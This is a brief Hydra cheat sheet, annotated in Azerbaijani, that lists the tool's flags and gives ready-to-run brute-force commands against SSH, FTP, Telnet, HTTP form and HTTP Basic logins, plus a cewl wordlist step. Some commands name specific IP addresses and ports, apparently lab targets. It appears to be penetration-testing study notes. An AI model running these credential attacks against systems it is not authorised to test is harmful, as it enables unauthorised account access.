# Hydra

```powershell
-t ( Thread )
-w ( Wait )
-s ( Port )
-L / -P ( İstifadəçi və parol siyahısı )
-vV ( Verbose )
-e ns ( "null" və "same" (istifadəçi adı ilə eyni parol) yoxlaması )
-l <user>: ( Tək istifadəçi adı )
-p <pass>: ( Tək parol )
-f İlk tapılan parolda dayan (exit).


hydra -L users.txt -P passwords.txt -t 4 ssh://<target_ip>
hydra -L users.txt -P passwords.txt ftp://<target_ip>
hydra -L users.txt -P passwords.txt telnet://<target_ip>

# HTTP (Form-based Login)
hydra -L top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/2023-200_most_used_passwords.txt -f 154.57.164.74 -s 30505 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# HTTP Basic Authentication
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.76 http-get / -s 30821

cewl -w target_words.txt http://<target_url>
hydra -L target_words.txt -P passwords.txt ssh://<target_ip>
```
